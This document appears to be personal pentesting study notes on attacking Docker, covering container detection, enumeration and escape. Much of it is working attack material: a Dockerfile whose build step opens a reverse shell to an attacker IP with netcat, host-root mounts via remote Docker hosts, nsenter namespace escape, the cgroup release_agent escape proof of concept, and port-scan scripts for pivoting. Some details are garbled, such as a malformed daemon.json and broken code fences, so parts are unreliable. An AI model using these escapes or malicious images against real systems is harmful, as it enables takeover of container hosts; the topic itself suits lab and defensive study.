# Docker Hacking


For basic information about docker try here: [[Intro-To-Docker]].
Containers have networking capabilities and their own file storage. They achieve this by using three components of the Linux kernel:

-   Namespaces - segregate system resources such as processes, files, and memory away from other namespaces.
-   Cgroups - Cgroups are used by containerization software such as LXC or Docker
-   OverlayFS

Typically you are trying to escape from a  container and general these escapes stem from misconfigurations of the container from services or access controls.

## How to know when you are in a container?
[pspy](https://github.com/DominicBreuker/pspy) on Linux or Systernals proc\*-related tools or access with tasklist for windows.
```bash
.dockerenv
ps aux # Lack of processes

cat /proc/1/cgroup 
cat /proc/1/cgroup | grep docker
```

[Deepce](https://github.com/stealthcopter/deepce.git) is like PEAS-NG for Docker

Docker has a socket [[Networks/Network-Protocols]] on 5000 so that another host can send commands to it, not default, but possible.


## Preface
Add IP and domain name to /etc/hosts
```bash
echo "$IP $DOMAIN" | tee -a /etc/hosts
```

Configure Docker to trust your instance, either make `/etc/docker/daemon.json` or enter:
```json
{
	 "target-id" : ["docker-domain.name:$DOCKERPORTLOW","docker-domain.name:$DOCKERPORTHIGH"]
}
```

Control Docker(Linux)
```bash
systemctl stop docker
systemctl start docker
```

Docker Commands
```bash
RUN echo "Docker"
COPY 
````
For full list see [Commands](https://docs.docker.com/engine/reference/commandline/cli/)

##  Docker Enumeration
On target machine enumerate the lay of the land:
```bash
docker -H $remotehost $dockcmd
docker ps
docker version
docker image ls
docker config ls
```

## Inside a Docker Image?
```bash
# Check routing
ip a
```

[cli Tool](https://github.com/containers/skopeo)

## GTFOBins/docker

```bash
docker images ls # list images required
```
[gtofbins](https://gtfobins.github.io/gtfobins/docker/#shell)

## Accessing Docker Container and exec..
```
docker -H $remotehost run -v /:/mnt --rm -it -d $image:$tag
docker -H $remotehost run -v /:/mnt --rm -it $image:$tag chroot /mnt sh
```

## Abusing Docker Registry
[Docker registries](https://docs.docker.com/registry/) are stateless server side application stores the Docker Image. Registries store and provide Docker images for use. Private registeries contain variouses called a **tag**. The Docker Registry is a JSON endpoint query it with 

Nmap scan to find the ports to interact with the container.

```bash
# postman
GET http://$domain:$port/
````

## Reversing Images
Download the image to reverse
```docker
docker pull app/app:$TAG
```

[Dive](https://github.com/wagoodman/dive) is a tool for exploring each layer in a docker image. 

## Uploading Malicious Docker Images
Dockerfile 
```docker
FROM $image:

RUN apt-get update -y
RUN apt-get install netcat -y # Socat would be better!
RUN nc -c /bin/sh $IP $PORT
```
Build image
```bash
docker build
```
Then upload with push:
```
docker push
```

## Shared Namespaces
Namespaces segregate system resources. Have root access inside the container or potential use pspy. 
Find a namespace
```bash
ps aux
```
We then mount the namespace of the process running outside of the container with a sh shell.
```
nsenter --target $PID --mount sh
```

## Misconfigured Privilieges
If a docker container is running with privileged mode it bypasses the Docker engine and has direct communication with host OS. List container capabilities with:
```
capsh --print | grep # admin chroot sys_module sys_time
```
The commented out greppables indicate privilege mode. [PoC](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)
```bash
# On the host
# docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## No ping and you need to pivot

Q: What is the Default Gateway for the Docker Container?

Use `/dev/tcp/ipaddr/port` or python

```bash
#!/bin/bash   
ports=(21 22 53 80 443 3306 8443 8080)   
for port in ${ports[@]}; do   
	timeout 1 
	bash -c "echo \"Port Scan Test\" > /dev/tcp/1.1.1.1/$port && echo $port is open || /dev/null"    
done
```


```python
#!/usr/bin/python3
import socket
host = "1.1.1.1"
portList = [21,22,53,80,443,3306,8443,8080]
for port in portList:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((host,port))
            print("Port ", port, " is open")
        except:
            print("Port ", port, " is closed")
```

N
`nc -zv 192.168.100.1 1-65535`

## References

[Docker](https://docs.docker.com/get-started/overview/)
[THM Room Docker Rodeo](https://tryhackme.com/room/dockerrodeo)
[trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)
[cgroups](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt)
[Commands](https://docs.docker.com/engine/reference/commandline/cli/)